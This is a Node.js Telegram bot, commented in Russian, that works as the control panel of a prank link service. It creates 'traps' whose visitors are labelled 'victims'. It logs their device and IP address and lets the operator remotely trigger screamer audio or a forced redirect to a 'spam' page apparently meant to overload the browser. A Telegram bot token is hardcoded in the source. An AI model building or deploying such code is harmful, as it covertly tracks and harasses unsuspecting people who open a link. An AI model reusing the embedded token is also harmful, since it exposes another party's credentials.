/**
 * 🛡️ NFC CONTROL SYSTEM - LITE
 * Упрощенная и чистая версия (RU)
 */

const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

// --- ПОДКЛЮЧЕНИЕ FFMPEG ---
const ffmpeg = require('fluent-ffmpeg');
const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
ffmpeg.setFfmpegPath(ffmpegPath);

// --- НАСТРОЙКИ ---
const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM';
const DOMAIN = 'https://prank-nfc.onrender.com';

// Проверка глобальных переменных
if (!global.sessions || !global.activeVictims || !global.shortLinks) {
    console.error('❌ ОШИБКА: Глобальные переменные не инициализированы!');
    process.exit(1);
}

const bot = new TelegramBot(token, { 
    polling: {
        interval: 300,
        autoStart: true,
        params: { timeout: 10 }
    }
});

const UPLOAD_DIR = path.join(__dirname, 'public', 'uploads');
const wizardState = {};

console.log('🚀 NFC Bot (Lite) запускается...');

// --- ГЕНЕРАТОР КОДА ---
function generateShortCode() {
    const chars = 'abcdefhkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 5; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
    if (global.shortLinks && global.shortLinks[result]) return generateShortCode();
    return result;
}

// --- ЗАГРУЗКА ФАЙЛОВ ---
async function downloadFile(fileId, type) {
    try {
        const link = await bot.getFileLink(fileId);
        const ext = path.extname(link);
        const name = `${type}_${Date.now()}_${uuidv4().slice(0,4)}${ext}`;
        const filePath = path.join(UPLOAD_DIR, name);
        
        const writer = fs.createWriteStream(filePath);
        const res = await axios({ url: link, method: 'GET', responseType: 'stream' });
        res.data.pipe(writer);

        return new Promise((resolve, reject) => {
            writer.on('finish', () => resolve({ url: `/uploads/${name}`, path: filePath }));
            writer.on('error', reject);
        });
    } catch (e) {
        console.error('Ошибка загрузки:', e);
        return { url: null, path: null };
    }
}

// --- FFMPEG ЛОГИКА ---
async function extractAudioFromVideo(videoPath) {
    return new Promise((resolve, reject) => {
        const audioPath = videoPath.replace(/\.(mp4|mov|avi|mkv)$/i, '.mp3');
        ffmpeg(videoPath)
            .toFormat('mp3')
            .audioCodec('libmp3lame')
            .audioBitrate('192k')
            .on('end', () => {
                const audioUrl = audioPath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
                resolve({ url: audioUrl, path: audioPath });
            })
            .on('error', (err) => reject(err))
            .save(audioPath);
    });
}

async function convertStickerToImage(stickerPath) {
    return new Promise((resolve, reject) => {
        const imagePath = stickerPath.replace(/\.webp$/i, '.jpg');
        ffmpeg(stickerPath)
            .outputOptions(['-vf', 'scale=800:800:force_original_aspect_ratio=decrease,pad=800:800:(ow-iw)/2:(oh-ih)/2:black'])
            .toFormat('mjpeg')
            .on('end', () => {
                const imageUrl = imagePath.replace(UPLOAD_DIR, '/uploads').replace(/\\/g, '/');
                fs.unlink(stickerPath, () => {});
                resolve({ url: imageUrl, path: imagePath });
            })
            .on('error', (err) => reject(err))
            .save(imagePath);
    });
}

// --- ГЛАВНОЕ МЕНЮ ---
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    
    const text = `<b>🤖 NFC Control</b>\n\nПривет! Это пульт управления пранками.\nВыбери действие в меню ниже:`;

    bot.sendMessage(chatId, text, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['➕ Новая ловушка'],
                ['📂 Мои сессии', 'ℹ️ Инфо']
            ],
            resize_keyboard: true
        }
    });
});

// --- ИНФО ---
bot.onText(/ℹ️ Инфо/, (msg) => {
    const vCount = Object.keys(global.activeVictims || {}).length;
    const sCount = Object.keys(global.sessions || {}).length;

    const infoMsg = `
<b>📊 Статистика:</b>
• Активных сессий: <b>${sCount}</b>
• Жертв онлайн: <b>${vCount}</b>
• Домен: <code>${DOMAIN}</code>

<b>Как создать:</b>
1. Нажми "Новая ловушка"
2. Отправь фото/стикер (фон)
3. Отправь звук/видео (скример)
4. Получи ссылку
`;
    bot.sendMessage(msg.chat.id, infoMsg, { parse_mode: 'HTML' });
});

// --- ОБРАБОТКА СООБЩЕНИЙ ---
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (text && text.startsWith('/')) return;

    // СОЗДАНИЕ
    if (text === '➕ Новая ловушка') {
        wizardState[chatId] = { step: 1, data: {} };
        bot.sendMessage(chatId, '<b>Шаг 1/2: Фон</b>\nОтправь фото, стикер, видео или напиши <code>skip</code>.', { parse_mode: 'HTML' });
        return;
    }

    // СПИСОК СЕССИЙ
    if (text === '📂 Мои сессии') {
        if (!global.sessions) return bot.sendMessage(chatId, 'Ошибка данных.');
        
        const sessions = Object.values(global.sessions);
        if (sessions.length === 0) return bot.sendMessage(chatId, 'Список пуст.');

        const recentSessions = sessions.slice(-5);
        bot.sendMessage(chatId, `Последние ${recentSessions.length} сессий:`);
        
        for (const s of recentSessions) {
            await new Promise(resolve => setTimeout(resolve, 200));
            sendControlPanel(chatId, s.id);
        }
        return;
    }

    // --- WIZARD ---
    if (wizardState[chatId]) {
        const st = wizardState[chatId];

        // ШАГ 1: ФОН
        if (st.step === 1) {
            let loadingMsg = await bot.sendMessage(chatId, '⏳ Обработка...');
            
            try {
                if (msg.photo) {
                    const f = await downloadFile(msg.photo[msg.photo.length - 1].file_id, 'img');
                    st.data.image = f.url || '';
                    st.data.sound = '';
                } 
                else if (msg.sticker) {
                    const f = await downloadFile(msg.sticker.file_id, 'sticker');
                    if (f.path) {
                        const converted = await convertStickerToImage(f.path);
                        st.data.image = converted.url || '';
                    }
                    st.data.sound = '';
                }
                else if (msg.video || msg.video_note) {
                    const fileId = msg.video ? msg.video.file_id : msg.video_note.file_id;
                    const f = await downloadFile(fileId, 'video');
                    if (f.path) {
                        const audioData = await extractAudioFromVideo(f.path);
                        st.data.sound = audioData.url || '';
                    }
                    st.data.image = '';
                }
                else if (text && text.toLowerCase() === 'skip') {
                    st.data.image = '';
                    st.data.sound = '';
                }
                else {
                    bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
                    return bot.sendMessage(chatId, '⚠️ Отправь файл или напиши skip.');
                }
            } catch (e) {
                console.error(e);
            }

            bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
            
            st.step = 2;
            const soundText = st.data.sound ? '✅ Звук уже есть (из видео).\nНапиши <code>skip</code> чтобы продолжить.' : '<b>Шаг 2/2: Звук</b>\nОтправь аудио/голос или <code>skip</code>.';
            bot.sendMessage(chatId, soundText, { parse_mode: 'HTML' });
            return;
        }

        // ШАГ 2: ЗВУК
        if (st.step === 2) {
            if (!st.data.sound || (msg.audio || msg.voice || msg.video)) {
                 let loadingMsg = await bot.sendMessage(chatId, '⏳ Загрузка звука...');
                 
                 if (msg.audio) {
                    const f = await downloadFile(msg.audio.file_id, 'snd');
                    st.data.sound = f.url || '';
                 }
                 else if (msg.voice) {
                    const f = await downloadFile(msg.voice.file_id, 'voice');
                    st.data.sound = f.url || '';
                 }
                 else if (msg.video) {
                    const f = await downloadFile(msg.video.file_id, 'video');
                    if (f.path) {
                        const audioData = await extractAudioFromVideo(f.path);
                        st.data.sound = audioData.url || '';
                    }
                 }
                 
                 bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{});
            }

            finishSessionCreation(chatId, st.data);
            delete wizardState[chatId];
        }
    }
});

// --- СОЗДАНИЕ СЕССИИ ---
function finishSessionCreation(chatId, data) {
    const id = uuidv4();
    const code = generateShortCode();

    const session = {
        id: id,
        shortCode: code,
        image: data.image || '',
        sound: data.sound || '',
        autoMode: true,
        totalVictims: 0,
        createdAt: new Date(),
        lastActiveAt: Date.now(),
        imagesFiles: [],
        soundsFiles: []
    };

    global.sessions[id] = session;
    global.shortLinks[code] = id;

    bot.sendMessage(chatId, '✅ Ловушка готова!');
    setTimeout(() => sendControlPanel(chatId, id), 300);
}

// --- ПАНЕЛЬ УПРАВЛЕНИЯ ---
function sendControlPanel(chatId, sessionId) {
    const s = global.sessions[sessionId];
    if (!s) return bot.sendMessage(chatId, 'Сессия не найдена.');

    const victims = Object.values(global.activeVictims || {}).filter(v => v.roomId === sessionId);
    const link = `${DOMAIN}/${s.shortCode}`;
    
    // Простой визуал статуса
    let statusText = `<b>🎮 Панель управления</b>\n\n` +
                     `🔗 <b>Ссылка:</b> <code>${link}</code>\n` +
                     `🆔 <b>Код:</b> <code>${s.shortCode}</code>\n\n` +
                     `⚙️ <b>Статус:</b>\n` +
                     `• Фон: ${s.image ? '✅' : '❌'}\n` +
                     `• Звук: ${s.sound ? '✅' : '❌'}\n` +
                     `• Авто-атака: ${s.autoMode ? 'Включена 🟢' : 'Выключена 🔴'}\n\n` +
                     `👥 <b>Жертв онлайн:</b> ${victims.length}\n` +
                     `👁 <b>Всего переходов:</b> ${s.totalVictims}`;

    if (victims.length > 0) {
        statusText += `\n\n📱 <b>Устройства:</b>\n`;
        victims.forEach((v, i) => {
            statusText += `${i + 1}. ${v.device} (IP: ${v.ip})\n`;
        });
    }

    bot.sendMessage(chatId, statusText, {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🔊 Скример', callback_data: `scare_${sessionId}` },
                    { text: '☢️ Спам', callback_data: `bomb_${sessionId}` }
                ],
                [
                    { text: `🤖 Авто: ${s.autoMode ? 'ON' : 'OFF'}`, callback_data: `auto_${sessionId}` },
                    { text: '🔄 Обновить', callback_data: `refresh_${sessionId}` }
                ],
                [
                    { text: '❌ Удалить', callback_data: `del_${sessionId}` }
                ]
            ]
        }
    }).catch(err => console.error(err.message));
}

// --- CALLBACKS ---
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    
    if (!data || !data.includes('_')) return;
    
    const [action, sessionId] = data.split('_');
    const s = global.sessions ? global.sessions[sessionId] : null;

    if (!s && action !== 'del') return bot.answerCallbackQuery(query.id, { text: 'Сессия не существует' });
    if (!global.io) return bot.answerCallbackQuery(query.id, { text: 'Ошибка сервера' });

    switch (action) {
        case 'scare':
            global.io.to(sessionId).emit('play-sound');
            bot.answerCallbackQuery(query.id, { text: '🔊 Бу!!' });
            break;

        case 'bomb':
            global.io.to(sessionId).emit('force-redirect', { url: `${DOMAIN}/volumeshader_bm.html` });
            bot.answerCallbackQuery(query.id, { text: '☢️ Спам запущен!' });
            break;

        case 'auto':
            s.autoMode = !s.autoMode;
            global.io.to(sessionId).emit('update-media', { sound: s.sound, image: s.image, auto: s.autoMode });
            
            // Обновляем кнопку
            const kb = query.message.reply_markup.inline_keyboard;
            kb[1][0].text = `🤖 Авто: ${s.autoMode ? 'ON' : 'OFF'}`;
            try {
                bot.editMessageReplyMarkup({ inline_keyboard: kb }, { chat_id: chatId, message_id: query.message.message_id });
            } catch (e) {}
            
            bot.answerCallbackQuery(query.id, { text: `Авто-режим: ${s.autoMode ? 'ON' : 'OFF'}` });
            break;

        case 'refresh':
            bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
            sendControlPanel(chatId, sessionId);
            bot.answerCallbackQuery(query.id, { text: 'Обновлено' });
            break;

        case 'del':
            if (global.sessions[sessionId]) delete global.sessions[sessionId];
            if (s && global.shortLinks[s.shortCode]) delete global.shortLinks[s.shortCode];
            bot.deleteMessage(chatId, query.message.message_id).catch(() => {});
            bot.answerCallbackQuery(query.id, { text: 'Удалено' });
            break;
    }
});

module.exports = bot;
